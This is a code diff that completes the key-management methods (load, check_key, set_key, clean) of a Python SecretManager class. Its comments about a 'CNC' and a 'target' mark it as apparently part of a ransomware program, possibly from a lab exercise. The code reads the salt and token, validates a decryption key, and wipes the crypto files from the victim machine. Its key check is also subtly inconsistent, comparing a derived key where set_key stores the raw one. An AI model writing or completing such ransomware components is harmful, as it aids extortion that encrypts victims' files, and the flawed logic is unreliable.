@@ -86,17 +86,41 @@ class SecretManager:
         self.post_new(self._salt, self._key, self._token)
 
 
-    def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
+    def load(self) -> None:
+        # Load salt and token from local files
+        salt_path = os.path.join(self._path, "salt.bin")
+        token_path = os.path.join(self._path, "token.bin")
 
-    def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+        if os.path.exists(salt_path) and os.path.exists(token_path):
+            with open(salt_path, "rb") as salt_file:
+                self._salt = salt_file.read()
+            with open(token_path, "rb") as token_file:
+                self._token = token_file.read()
+            self._log.info("Loaded salt and token from local files")
+        else:
+            self._log.error("Salt or token file not found")
 
-    def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+    def check_key(self, candidate_key: bytes) -> bool:
+        # Verify if the candidate key is valid
+        derived_key = self.do_derivation(self._salt, candidate_key)
+
+        # Compare the derived key with the stored key
+        if self._key == derived_key:
+            return True
+        else:
+            return False
+
+    def set_key(self, b64_key: str) -> None:
+        # Decode the base64 key and set it as the self._key if it's valid
+        candidate_key = base64.b64decode(b64_key)
+
+        if self.check_key(candidate_key):
+            self._key = candidate_key
+            self._log.info("Key set successfully")
+        else:
+            self._log.error("Invalid key provided")
+            raise ValueError("Invalid key")
+
 
     def get_hex_token(self) -> str:
         # Return a string composed of hex symbols, regarding the token
@@ -117,6 +141,20 @@ class SecretManager:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
 
-    def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+    def clean(self) -> None:
+        # Remove the local cryptographic files
+        salt_file = os.path.join(self._path, "salt.bin")
+        token_file = os.path.join(self._path, "token.bin")
+
+        try:
+            if os.path.exists(salt_file):
+                os.remove(salt_file)
+                self._log.info("Salt file removed")
+
+            if os.path.exists(token_file):
+                os.remove(token_file)
+                self._log.info("Token file removed")
+
+        except Exception as e:
+            self._log.error(f"Error cleaning local cryptographic files: {e}")
+            raise
